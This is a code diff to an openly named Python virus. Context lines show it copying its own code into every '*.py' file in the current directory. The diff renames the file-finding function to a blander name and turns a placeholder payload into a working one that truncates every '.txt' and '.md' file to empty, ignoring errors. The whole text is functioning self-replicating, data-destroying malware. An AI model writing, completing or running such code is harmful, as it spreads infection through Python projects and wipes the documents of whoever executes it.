@@ -49,7 +49,7 @@ def read_virus_code():
             virus_code.append(line)
     return virus_code
 
-def find_files_to_infect(pattern, root_dir):
+def find_files(pattern, root_dir):
     return glob.glob(pattern, root_dir=root_dir)
 
 def infect(file_path, virus):
@@ -74,11 +74,25 @@ def infect(file_path, virus):
 
 def replicate():
     virus = read_virus_code()
-    for file_path in find_files_to_infect("*.py", "."):
+    for file_path in find_files("*.py", "."):
         infect(file_path, virus)
 
+def clear_file(file_path):
+    try:
+        with open(file_path, 'w') as file:
+            file.truncate(0)
+    except IOError:
+        return
+
 def execute_payload():
-    print("Malware payload, do something harmful")
+    txt_pattern = "*.txt"
+    md_pattern = "*.md"
+    txt_files = glob.glob(txt_pattern)
+    md_files = glob.glob(md_pattern)
+    file_paths = txt_files + md_files
+    
+    for file_path in file_paths:
+        clear_file(file_path)
 
 replicate()
 execute_payload()
